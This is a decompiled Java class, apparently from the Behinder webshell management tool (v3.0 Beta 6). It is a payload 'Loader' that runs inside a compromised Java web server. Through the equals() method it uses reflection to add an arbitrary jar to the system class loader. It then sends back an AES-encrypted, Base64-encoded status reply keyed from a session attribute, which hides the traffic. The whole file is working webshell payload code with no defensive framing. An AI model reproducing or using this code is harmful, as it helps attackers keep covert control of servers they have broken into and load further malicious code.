package net.rebeyond.behinder.payload.java;

import java.io.File;
import java.lang.reflect.Method;
import java.net.URL;
import java.net.URLClassLoader;
import java.util.HashMap;
import java.util.List;
import java.util.Map;
import javax.crypto.Cipher;
import javax.crypto.spec.SecretKeySpec;
import javax.servlet.ServletOutputStream;
import javax.servlet.ServletRequest;
import javax.servlet.ServletResponse;
import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;
import javax.servlet.http.HttpSession;
import javax.servlet.jsp.PageContext;


public class Loader {
    public static String libPath;
    private ServletRequest Request;
    private ServletResponse Response;
    private HttpSession Session;

    public boolean equals(Object obj) {
        PageContext page = (PageContext) obj;
        this.Session = page.getSession();
        this.Response = page.getResponse();
        this.Request = page.getRequest();

        Map<String, String> result = new HashMap<>();

        try {
            URL url = (new File(libPath)).toURI().toURL();
            URLClassLoader urlClassLoader = (URLClassLoader) ClassLoader.getSystemClassLoader();
            Method add = URLClassLoader.class.getDeclaredMethod("addURL", new Class[]{URL.class});
            add.setAccessible(true);
            add.invoke(urlClassLoader, new Object[]{url});
            result.put("status", "success");
        } catch (Exception e) {
            result.put("status", "fail");
            result.put("msg", e.getMessage());
        }
        try {
            ServletOutputStream so = this.Response.getOutputStream();
            so.write(Encrypt(buildJson(result, true).getBytes("UTF-8")));
            so.flush();
            so.close();
            page.getOut().clear();
        } catch (Exception e) {

            e.printStackTrace();
        }
        return true;
    }

    public boolean equals1(HttpServletRequest request, HttpServletResponse response) {

        this.Session = request.getSession();
        this.Response = response;
        this.Request = request;

        Map<String, String> result = new HashMap<>();

        try {
            URL url = (new File(libPath)).toURI().toURL();
            URLClassLoader urlClassLoader = (URLClassLoader) ClassLoader.getSystemClassLoader();
            Method add = URLClassLoader.class.getDeclaredMethod("addURL", new Class[]{URL.class});
            add.setAccessible(true);
            add.invoke(urlClassLoader, new Object[]{url});
            result.put("status", "success");
        } catch (Exception e) {
            result.put("status", "fail");
            result.put("msg", e.getMessage());
        }
        try {
            ServletOutputStream so = this.Response.getOutputStream();
            so.write(Encrypt(buildJson(result, true).getBytes("UTF-8")));
            so.flush();
            so.close();
        } catch (Exception e) {

            e.printStackTrace();
        }
        return true;
    }



    private String buildJsonArray(List<Map<String, String>> list, boolean encode) throws Exception {
        StringBuilder sb = new StringBuilder();
        sb.append("[");
        for (Map<String, String> entity : list) {
            sb.append(buildJson(entity, encode) + ",");
        }
        if (sb.toString().endsWith(","))
            sb.setLength(sb.length() - 1);
        sb.append("]");
        return sb.toString();
    }

    private String buildJson(Map<String, String> entity, boolean encode) throws Exception {
        StringBuilder sb = new StringBuilder();
        String version = System.getProperty("java.version");
        sb.append("{");
        for (String key : entity.keySet()) {

            sb.append("\"" + key + "\":\"");
            String value = ((String) entity.get(key)).toString();
            if (encode) {
                if (version.compareTo("1.9") >= 0) {

                    getClass();
                    Class<?> Base64 = Class.forName("java.util.Base64");
                    Object Encoder = Base64.getMethod("getEncoder", null).invoke(Base64, (Object[]) null);
                    value = (String) Encoder.getClass().getMethod("encodeToString", new Class[]{byte[].class}).invoke(Encoder, new Object[]{value.getBytes("UTF-8")});
                } else {

                    getClass();
                    Class<?> Base64 = Class.forName("sun.misc.BASE64Encoder");
                    Object Encoder = Base64.newInstance();
                    value = (String) Encoder.getClass().getMethod("encode", new Class[]{byte[].class}).invoke(Encoder, new Object[]{value.getBytes("UTF-8")});

                    value = value.replace("\n", "").replace("\r", "");
                }
            }
            sb.append(value);
            sb.append("\",");
        }
        if (sb.toString().endsWith(","))
            sb.setLength(sb.length() - 1);
        sb.append("}");
        return sb.toString();
    }

    private byte[] Encrypt(byte[] bs) throws Exception {
        String key = this.Session.getAttribute("u").toString();
        byte[] raw = key.getBytes("utf-8");
        SecretKeySpec skeySpec = new SecretKeySpec(raw, "AES");
        Cipher cipher = Cipher.getInstance("AES/ECB/PKCS5Padding");
        cipher.init(1, skeySpec);
        byte[] encrypted = cipher.doFinal(bs);
        return encrypted;
    }
}


/* Location:              /Users/kongzhen/kz_s3c/Behinder_v3.0_Beta_6_mac/Behinder_v3.0_Beta6_mac.jar!/net/rebeyond/behinder/payload/java/Loader.class
 * Java compiler version: 8 (52.0)
 * JD-Core Version:       1.1.3
 */